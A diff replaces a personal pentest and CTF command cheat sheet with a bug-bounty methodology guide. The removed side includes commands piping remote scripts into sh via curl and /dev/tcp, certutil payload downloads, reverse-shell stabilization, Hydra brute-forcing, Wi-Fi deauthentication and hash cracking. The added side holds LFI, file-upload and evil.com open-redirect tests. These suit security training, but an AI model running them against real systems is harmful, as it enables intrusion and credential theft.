@@ -1,400 +1,502 @@
-# My Quick Linux Command List
+<h1 align="center">Bug Bounty Hunting Methodology 2025</h1>
 
-Virtual space inside terminal:
--------------------------------------
-```
-python3 -m venv env 
-source env/bin/activate
-```
+<div align="center">
+   
+[![Edition](https://img.shields.io/badge/Edition-2025-blue)](#)
+[![Author](https://img.shields.io/badge/Author-Amr%20Elsagaei-green)](#)
+[![YouTube](https://img.shields.io/badge/AmrSecOfficial-c00?logo=youtube&logoColor=white)](https://www.youtube.com/@AmrSecOfficial)
+[![Twitter](https://img.shields.io/badge/amrelsagaei-black?logo=X)](https://twitter.com/amrelsagaei)
+[![Telegram](https://img.shields.io/badge/AmrSecOfficial-0088CC?logo=telegram&logoColor=white)](https://t.me/AmrSecOfficial)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-amrelsagaei-0073e3?logo=linkedin&labelColor=white)](https://www.linkedin.com/in/amrelsagaei)
 
-Apache server:
--------------------------------------
-```
-sudo systemctl start apache2
-sudo systemctl stop apache2
-sudo systemctl restart apache2
-enable systemctl apache2
-sudo nano /etc/apache2/apache2.conf (apache config file to change port and other things)
-```
+</div>
 
-Gobuster subdomain Enumeration:
---------------------------------------
-```
-gobuster vhost -u example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 4 --append-domain
-```
-```
-gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains=top1million-5000.txt -t 10 
-```
-Dirsearch directory find:
---------------------------------------
-```
-dirsearch -u http://url.com/ -e*
-```
-```
-gobuster dir -u http://url.com/ -w wordlist -t 10
-```
+<br>
+<div style="text-align: center;">
+    <a href="https://youtu.be/bAHNM8IInwE" target="_blank">
+        <img src="https://blog.amrelsagaei.com/storage/posts/webp/bug-bounty-metho-2025.webp" alt="Bug Bounty Methodology 2025 Edition" style="width: 100%;">
+    </a>
+</div>
+<div align="left">
+Welcome to the <strong>Bug Bounty Methodology 2025 Edition</strong>! This methodology is a basic guide to help you kickstart your bug bounty journey. It outlines the essential steps to navigate your target effectively, but the real challenge lies in identifying high-impact vulnerabilities through your own skills and creativity. This methodology will be updated regularly as new and interesting techniques emerge to enhance your testing process.
+</div>
 
-Host file direct entry:
---------------------------------------
-```
-echo "10.10.11.254 demo.skyfall.htb" | sudo tee -a /etc/hosts
-```
 
-Locating scripts in unix:
---------------------------------------
-```
-locate *.nse | grep <servicename> 
-``` 
+<br>
+## 📜 Table of Contents
 
-FOr stable shell and internal machine to machine download:
---------------------------------------------------------------------
-```
-python3 -c "import pty;pty.spawn('/bin/bash')"
-certutil -urlcache -f http://10.10.14.154:8888/nc64.exe nc64.exe #(windows)
-wget http://ipaddress:portnumber/filename #(for both linux and windows)
-```
+| Section | Description |
+|---------|-------------|
+| 1. [Reconnaissance](#1-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Initial Scanning |
+| 2. [Discovery](#2-discovery-and-probing) | HTTP Probing & Asset Discovery |
+| 3. [Enumeration](#3-advanced-enumeration-techniques) | Advanced Techniques & Parameter Discovery |
+| 4. [Testing](#4-vulnerability-testing) | Vulnerability Assessment |
+| 5. [Two-Eye Approach](#5-the-two-eye-approach) | What is that? |
+| 6. [POC Creation](#6-proof-of-concept-poc-creation) | Documentation & Evidence |
+| 7. [Reporting](#7-reporting) | Final Documentation |
 
-Privilege Escalation common Commands:
----------------------------------------------------------------------------
-```
-whoami
-ls -la
-uname -a
-cat /proc/version
-id 
-history
-sudo -l
-cat /etc/crontab
-find / -perm -u=s -type f 2>/dev/null
-netstat -tuln
-getcap -r / 2>/dev/null
-filecap
+---
 
-```
+<br>
 
-Linepeas Installation on Target with and without internet
----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+## **1. Reconnaissance and Subdomain Enumeration**
+
+### **1.1 Passive Subdomain Enumeration**
+**🛠️Tools:** [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [CRTSH](https://crt.sh/), [Github-Search](https://github.com/gwen001/github-search)
+
+**Subfinder**
 ```bash
-# From github
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# Without curl
-python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-
-python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt
 ```
 
+**Amass (Passive Mode)**
 ```bash
-# Local network
-sudo python3 -m http.server 80 #Host
-curl 10.10.10.10/linpeas.sh | sh #Victim
-
-# Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+amass enum -passive -d target.com -o amass_passive_subs.txt
 ```
 
-ligolo-ng port forwarding tool commands:
------------------------------------------------------------------------
-```
-sudo ip tuntap add user root mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert (for hacking ctf machines)
-./proxy -autocert (for real world)
-./agent -connect 10.10.16.35:11601 -ignore-cert (target machine use this command)
-session (choose session or simply press senter)
-start (use this command in ligolo)
-sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)
+**CRT.sh Query**
+```bash
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew crtsh_subs.txt
 ```
 
-Port Forwarding using SSH
--------------------------------------------------------------------------------------------
-```
- ssh -L 8888:localhost:8080 rajesh@34.44.2.255 (with password)
- ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
- (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)
+**Github Dorking**
+```bash
+github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt
 ```
 
-SSH RELATED:
-------------------------------------------------------------------------------------
-```
-nano /etc/ssh/sshd_config
-cat /etc/passwd | cut -d: -f1  #(display all users in the machine)
-sudo service ssh restart 
-sudo passwd -S username
-sudo passwd -u username
-ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555 #(ssh portforwarding for adb in mobile)
+**Results Combination**
+```bash
+cat *_subs.txt | sort -u | anew all_subs.txt
 ```
 
-for adding a new user:
-----------------------------
-```
-sudo adduser reddy
-sudo usermod -aG sudo reddy
-nano /etc/sudoers    #(adding user to sudoers file to get su permission)
-usrname  ALL=(ALL:ALL) ALL
-```
-searching and removing user from using sudo and giving file permissions:
---------------------------------------------------------------------------------------
-```
-sudo gpasswd -d username sudo (to remove sudo permisson of anyuser)
-getent group sudo (to list the sudo users in sudo group)
+### **1.2 Active Subdomain Enumeration**
 
-nano /etc/sudoers    (adding user to sudoers file to get su permission)
-username  ALL=(ALL:ALL) ALL (giving all executable permissions)
+**🛠️Tools:** [MassDNS](https://github.com/blechschmidt/massdns), [Shuffledns](https://github.com/projectdiscovery/shuffledns), [DNSX](https://github.com/projectdiscovery/dnsx), [SubBrute](https://github.com/TheRook/subbrute), [FFuF](https://github.com/ffuf/ffuf)
 
-sudo chown -R kali:www-data html
-sudo chmod -R 750 folder (to remove forbidden access)
-sudo chmod g+w /var/www/html/*.php /var/www/html/*.html
-
-sudo chmod 775 test.sh
-sudo chown tennyson:tennyson test.sh
+**MassDNS**
+```bash
+massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt
 ```
 
-Stabilizing the reverse shell:
------------------------------------------------------------------------------------
-```
-script /dev/null -c /bin/bash
-CTRL + Z
-stty raw -echo; fg
-Then press Enter twice, and then enter:
-export TERM=xterm
+**Shuffledns**
+```bash
+shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt
 ```
 
-
-Converting ova to vmdk and other extensions:
------------------------------------------------------------------------------------
-```
-tar xvf HF2019-Linux.ova #(unziping ova file)
-./VBoxManage clonehd "S:\HF2019-Linux.ova\HF2019-Linux\HF2019-Linux-disk001.vdi" S:\HF2019-Linux.ova\vmdk\disk.vmdk --format VMDK
+**DNSX Resolution**
+```bash
+dnsx -l active_subs.txt -resp -o resolved_subs.txt
 ```
 
-All cmds on extracting and compressig:
---------------------------------------------------------------------------------------
-## zip
-```
-zip archive.zip file1 file2 directory1
-unzip archive.zip (to extract .zip)
-```
-## tar compression
-```
-tar -cvf archive.tar file1 file2 directory1
-tar -cvzf archive.tar.gz file1 file2 directory1
-tar -cvjf archive.tar.bz2 file1 file2 directory1
-tar -cvJf archive.tar.xz file1 file2 directory1
-```
-## tar extraction
-```
-tar -xvf archive.tar
-tar -xzvf archive.tar.gz
-tar -xjvf archive.tar.bz2
-tar -xJvf archive.tar.xz
-```
-## gzip
-```
-gzip file.txt
-gunzip file.txt.gz (to extract .gz)
-```
-## bzip2
-```
-bzip2 file.txt
-bunzip2 file.txt.bz2 (to extract .bz2)
-```
-## xz file.txt
-```
-xz file.txt
-unxz file.txt.xz (to extract .xz)
-``` 
-## 7z
-```
-7z a archive.7z file1 file2 directory1
-7za x archive.7z (to extract .7z)
-
-```
-## rar
-```
-rar a archive.rar file1 file2 directory1
-unrar x archive.rar  (to extract .rar)
+**SubBrute**
+```bash
+python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt
 ```
 
-Grep filtering commands
------------------------------------------------------------------------------------------------------
-```
-grep -oP '(?<=^| )([0-9]{1,3}\.){3}[0-9]{1,3}(?= |$)'| sort | uniq  (filter ipaddress)
-grep -Ev '^\s*https?://|.{41,}|^\s*$' | grep -E '[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}:[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}' | grep -v -e 'http://' -e 'https://' (filter credentails)
-grep -ril 'username' /var/www/html (will show the files contains username)
-find /var/www/html -type f -name "*.php" -exec grep -l 'username' {} + | xargs grep -l 'password'
-
+**FFuF Subdomain**
+```bash
+ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt
 ```
 
-Manual assigning of ipv4 to wlan0
------------------------------------------------------------------------------------
-```
-ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
+### **1.3 Handling Specific (Non-Wildcard) Targets**
+
+**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Katana](https://github.com/projectdiscovery/katana), [Hakrawler](https://github.com/hakluke/hakrawler)
+
+**GAU**
+```bash
+gau target.example.com | anew gau_results.txt
 ```
 
-Server Message Block (SMB):
-----------------------------------------------------------
-```
-		smbclient //<server>/<share> -U <username>
-		smbclient -L //<target-ip> -U <username>
-		smbclient //<target-ip>/<share-name> -U <username>
-		smbclient //<target-ip>/<share-name> -U <username> --pwfile=<password-file>
-		smbclient //<target-ip>/share -N
-```
---------------------------------------------------------------
-
-Hash cracking:
-----------------------------------------------------------
-## John The Ripper (basic Format)
-```
-john -w=<wordlist> hash.txt
-john --format=raw-md5 --wordlist=<wordlist> <hash_file>
-john --format=bcrypt --wordlist=<wordlist> <hash_file>
-john --format=raw-sha1 --wordlist=<wordlist> <hash_file>
-john --format=raw-sha256 --wordlist=<wordlist> <hash_file>
-john --incremental=All <hashfile>
-```
-## john hash converting
-```
-zip2john filename.zip > output.hash (for zip files)
-veracrypt2john encrypted_volume.vc > output.hash (for veracrypt files)
-rar2john filename.rar > output.hash (for rar files)
-pdf2john.pl filename.pdf > output.hash (for pdf files)
-office2john filename.docx > output.hash (for Word, Excel, PowerPoint files)
-unshadow /etc/passwd /etc/shadow > combined.hash (for linux password hashes)
-samdump2 SYSTEM SAM > sam.hash (for windows password hashes)
-ssh2john id_rsa > ssh.hash (for ssh private key passphrases)
-7z2john protected.7z > 7z.hash (for 7z files)
-iphone2john.pl backup > iphone.hash (for iphone encrypted backup files)
-vnc2john vnc_password_file > vnc.hash (for vnc passwords)
-```
-to show already cracked hashes
-```
-john --show <hashfile>
+**Waybackurls**
+```bash
+waybackurls target.example.com | anew wayback_results.txt
 ```
 
-## hashcat (basic format)
-```
-hashcat -m 0 -a 0 <hash_file> <wordlist>  (md5 hashes)
-hashcat -m 3200 -a 0 <hash_file> <wordlist> (bcrypt hashes)
-hashcat -m 100 -a 0 <hash_file> <wordlist> (sha1 hashes)
-hashcat -m 1400 -a 0 <hash_file> <wordlist> (sha 256 hashes)
-```
-to show already cracked hashes
-```
-hashcat --show <hashfile>
+**Katana**
+```bash
+katana -u target.example.com -silent -jc -o katana_results.txt
 ```
 
-FTP server:
----------------------------------------------------------
-```
-apt install vsftpd
-systemctl start vsftpd
-systemctl enable vsftpd
-systemctl status vsftpd
+**Hakrawler**
+```bash
+echo "https://target.example.com" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt
 ```
 
+### **Additional Advanced Techniques**
 
-wireless hacking
-------------------------------------------------------------------------------------
-```
-sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
-sudo airodump-ng wlan0mon #(Start capturing traffic:)
-sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
-sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
-```
+**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)
 
-Crack the handshake:
---------------------------------------------
-```
-sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
-aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
-aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
-```
-Hydra all brute force commands:
---------------------------------------------------------------------------------------------
-```
-note "-P" capital for passwordlists if it is only single password use small "-p"
-hydra -l <username> -P <passwords_file> <target_ip> ssh
-hydra -l <username> -P <passwords_file> <target_ip> ftp
-hydra -l <username> -P <passwords_file> <target_ip> mysql
-hydra -l <username> -p <password> <ip> <service> -s <port>
-hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
-hydra -C <combinations.txt> <ip> <service>
-hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
-hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
-hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
-hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
-hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.176.80 http-post-form '/login.php:Username=^USER^&Password=^PASS^&Submit=Login:<strong>Warning!</strong> Incorrect information.' -V (for alert message login failed brute force)
+**Reverse DNS**
+```bash
+dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt
 ```
 
-wireshark packet filters:
-------------------------------------------------------------------------------------------
-## Protocol Filters:
-```
-tcp: Filters TCP traffic.
-udp: Filters UDP traffic.
-icmp: Filters ICMP traffic.
-http: Filters HTTP traffic.
-dns: Filters DNS traffic.
-arp: Filters ARP traffic.
-smtp: Filters SMTP traffic.
-ftp: Filters FTP traffic.
-ssl: Filters SSL/TLS traffic.
-ssh: Filters SSH traffic.
-```
-## Address Filters:
-```
-ip.addr == x.x.x.x: Filters traffic for a specific IP address.
-ip.src == x.x.x.x: Filters traffic with a specific source IP address.
-ip.dst == x.x.x.x: Filters traffic with a specific destination IP address.
-eth.addr == xx:xx:xx:xx:xx:xx: Filters traffic based on MAC address.
-```
-## Port Filters:
-```
-tcp.port == xxxx: Filters TCP traffic on a specific port.
-udp.port == xxxx: Filters UDP traffic on a specific port.
-```
-## Logical Operators:
-```
-and: Logical AND operator.
-or: Logical OR operator.
-not: Logical NOT operator.
-```
-## Comparisons:
-```
-==: Equals.
-!=: Not equal.
->: Greater than.
-<: Less than.
-```
-## Range Filters:
-```
-ip.addr in x.x.x.x/y: Filters traffic within a specific IP address range.
-tcp.port in {x, y, z}: Filters traffic on multiple TCP ports.
-udp.port in {x, y, z}: Filters traffic on multiple UDP ports.
-```
-## Display Filters:
-```
-frame.number == n: Filters by frame number.
-frame.time_relative > n: Filters by time relative to the start of capture.
-```
-## HTTP Filters:
-```
-http.request.method == "GET": Filters HTTP GET requests.
-http.response.code == 200: Filters HTTP responses with status code 200.
-http.host == "example.com": Filters HTTP traffic for a specific host.
-```
-## DNS Filters:
-```
-dns.qry.name == "example.com": Filters DNS queries for a specific domain.
-dns.resp.addr == x.x.x.x: Filters DNS responses with a specific IP address.
-```
-## SSL/TLS Filters:
-```
-ssl.handshake: Filters SSL handshake packets.
-ssl.record.content_type == 23: Filters SSL application data packets.
+**ASN Enumeration**
+```bash
+amass intel -asn <ASN_NUMBER> -o asn_results.txt
 ```
 
+**Cloud Asset Enumeration**
+```bash
+cloud_enum -k target.com
+```
+
+**Results Validation**
+```bash
+cat all_subs.txt | httpx -silent -title -o live_subdomains.txt
+```
+
+---
+
+<br>
+
+
+## **2. Discovery and Probing**
+
+### **2.1 HTTP Probing**
+
+**🛠️Tools:** [httpx](https://github.com/projectdiscovery/httpx), [httprobe](https://github.com/tomnomnom/httprobe)
+
+**HTTPX Probing**
+```bash
+httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt
+```
+
+**Custom Filtering**
+```bash
+cat live_websites.txt | grep -i "login\|admin" | tee login_endpoints.txt
+```
+
+### **2.2 JavaScript Analysis**
+
+**🛠️Tools:** [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [subjs](https://github.com/lc/subjs), [JSFinder](https://github.com/Threezh1/JSFinder), [GF](https://github.com/tomnomnom/gf)
+
+**JS Extraction**
+```bash
+cat live_websites.txt | waybackurls | grep "\.js" | anew js_files.txt
+```
+
+**LinkFinder Analysis**
+```bash
+python3 linkfinder.py -i js_files.txt -o js_endpoints.txt
+```
+
+**Sensitive Pattern Search**
+```bash
+cat js_files.txt | gf aws-keys | tee aws_keys.txt
+cat js_files.txt | gf urls | tee sensitive_urls.txt
+```
+
+**API Key Validation**
+```bash
+curl -X GET "https://api.example.com/resource" -H "Authorization: Bearer <extracted_key>"
+```
+
+### **2.3 Advanced Google Dorking**
+
+**🛠️Tools:** [GitDorker](https://github.com/obheda12/GitDorker)
+
+**Automated Dorking**
+```bash
+python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt
+```
+
+**Admin/Login Files**
+```bash
+site:*.example.com inurl:"*admin | login" | inurl:.php | .asp
+```
+
+**Config Files**
+```bash
+site:*.example.com ext:env | ext:yaml | ext:ini
+```
+
+**Public Keys**
+```bash
+site:*.example.com inurl:"id_rsa.pub" | inurl:".pem"
+```
+
+### **2.4 URL Discovery**
+
+**🛠️Tools:** [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler)
+
+**Katana Crawling**
+```bash
+katana -list live_websites.txt -jc -o katana_urls.txt
+```
+
+**Gospider**
+```bash
+gospider -s "https://target.com" -d 2 -o gospider_output/
+```
+
+**Hakrawler**
+```bash
+echo "https://target.com" | hakrawler -depth 3 -plain -out hakrawler_results.txt
+```
+
+### **2.5 Archive Enumeration**
+
+**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [ParamSpider](https://github.com/devanshbatham/ParamSpider)
+
+**Archive URL Collection**
+```bash
+gau --subs target.com | anew archived_urls.txt
+waybackurls target.com | anew wayback_urls.txt
+```
+
+**Parameter Extraction**
+```bash
+cat archived_urls.txt | grep "=" | anew parameters.txt
+```
+
+---
+
+<br>
+
+
+## **3. Advanced Enumeration Techniques**
+
+### **3.1 Parameter Discovery**
+
+**🛠️Tools:** [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [FFuF](https://github.com/ffuf/ffuf)
+
+**Arjun Parameter Discovery**
+```bash
+arjun -u "https://target.example.com" -m GET,POST --stable -o params.json
+```
+
+**ParamSpider Web Parameters**
+```bash
+python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt
+```
+
+**FFuF Parameter Bruteforce**
+```bash
+ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt
+```
+
+### **3.2 Cloud Asset Enumeration**
+
+**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)
+
+**Cloud Bucket Enumeration**
+```bash
+cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt
+```
+
+**S3 Bucket Access Test**
+```bash
+aws s3 ls s3://<bucket_name> --no-sign-request
+```
+
+**S3 Bucket Content Dump**
+```bash
+python3 AWSBucketDump.py -b target-bucket -o dumped_data/
+```
+
+### **3.3 Content Discovery**
+
+**🛠️Tools:** [Feroxbuster](https://github.com/epi052/feroxbuster), [FFuF](https://github.com/ffuf/ffuf), [Dirsearch](https://github.com/maurosoria/dirsearch)
+
+**Feroxbuster**
+```bash
+feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt
+```
+
+**Dirsearch**
+```bash
+dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt
+```
+
+**FFuF Recursive**
+```bash
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt
+```
+
+### **3.4 API Enumeration**
+
+**🛠️Tools:** [Kiterunner](https://github.com/assetnote/kiterunner), [Postman](https://www.postman.com/), [Burp Suite](https://portswigger.net/burp)
+
+**Kiterunner**
+```bash
+kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt
+```
+
+### **3.5 ASN Mapping**
+
+**🛠️Tools:** [Amass](https://github.com/OWASP/Amass), [Shodan](https://www.shodan.io/), [Censys](https://censys.io/)
+
+**ASN Lookup**
+```bash
+amass intel -asn <ASN_Number> -o asn_ips.txt
+```
+
+**Shodan Enumeration**
+```bash
+shodan search "net:<ip_range>" --fields ip_str,port --limit 100
+```
+
+**Censys Asset Search**
+```bash
+censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
+```
+
+---
+
+<br>
+
+
+## **4. Vulnerability Testing**
+
+### **4.1 High-Priority Vulnerabilities**
+
+**🐞CSRF Testing**
+```bash
+cat live_websites.txt | gf csrf | tee csrf_endpoints.txt
+```
+
+**🐞LFI Testing**
+```bash
+cat live_websites.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I@ curl -s @ | grep "root:x:" > lfi_results.txt
+```
+
+**🐞RCE Testing**
+```bash
+curl -X POST -F "file=@exploit.php" https://target.com/upload
+```
+
+**🐞SQLi Testing**
+```bash
+ghauri -u "https://target.com?id=1" --dbs --batch
+```
+
+**🐞Sensitive Data Search**
+```bash
+cat js_files.txt | grep -Ei "key|token|auth|password" > sensitive_data.txt
+```
+
+**🐞Open Redirect Test**
+```bash
+cat urls.txt | grep "=http" | qsreplace "https://evil.com" | xargs -I@ curl -I -s @ | grep "evil.com"
+```
+
+---
+
+<br>
+
+
+## **5. The "Two-Eye" Approach 👀**
+1. **First Eye:** Focus on testing every gathered subdomain, endpoint, or parameter for common vulnerabilities.
+2. **Second Eye:** Identify “interesting” findings like exposed credentials, forgotten subdomains, or admin panels.
+
+### **Actionable Steps:**
+- If a vulnerability is identified, create a proof of concept (POC) and test its impact.
+- If no vulnerabilities are found, pivot to deeper testing on unique subdomains or endpoints.
+
+
+
+---
+
+<br>
+
+
+## **6. Proof of Concept (POC) Creation**
+
+### **🎥Video POC**
+
+Demonstrate vulnerabilities in action using screen recording tools like Greenshot or OBS Studio.
+
+### **📸Screenshot POC**
+
+Capture clear screenshots with annotations to explain each step.
+
+- **🛠️Tool:** Greenshot.
+
+
+---
+
+<br>
+
+
+## **7. Reporting**
+
+### **📝Report Structure**
+
+1. **Executive Summary**
+   - Target Scope
+   - Testing Timeline
+   - Key Findings Summary
+   - Risk Ratings
+
+2. **Technical Details**
+   - Vulnerability Title
+   - Severity Rating
+   - Affected Components
+   - Technical Description
+   - Steps to Reproduce
+   - Impact Analysis
+   - Supporting Evidence (POC)
+
+3. **Remediation**
+   - Detailed Recommendations
+   - Mitigation Steps
+   - Additional Security Controls
+   - References & Resources
+
+4. **Supporting Materials**
+   - Video Demonstrations
+   - Screenshots & Annotations
+   - HTTP Request/Response Logs
+   - Code Snippets
+   - Timeline of Discovery
+
+### **Best Practices**
+
+- Write clear, concise descriptions
+- Include detailed reproduction steps
+- Provide actionable remediation advice
+- Support findings with evidence
+- Use professional formatting
+- Highlight business impact
+- Include verification steps
+
+### **Report Format**
+
+```markdown
+# Vulnerability Report: [Title]
+
+## Overview
+- Severity: [Critical/High/Medium/Low]
+- CVSS Score: [Score]
+- Affected Component: [Component]
+
+## Description
+[Detailed technical description]
+
+## Steps to Reproduce
+1. [Step 1]
+2. [Step 2]
+3. [Step n...]
+
+## Impact
+[Business and technical impact]
+
+## Proof of Concept
+[Screenshots, videos, code]
+
+## Recommendations
+[Detailed fix recommendations]
+
+## References
+[CVE, CWE, related resources]
+```
+
+---
+
+<br>
+
+
+## 📄 License
+All Rights Reserved © 2025 **Amr Elsagaei (AmrSec)**.
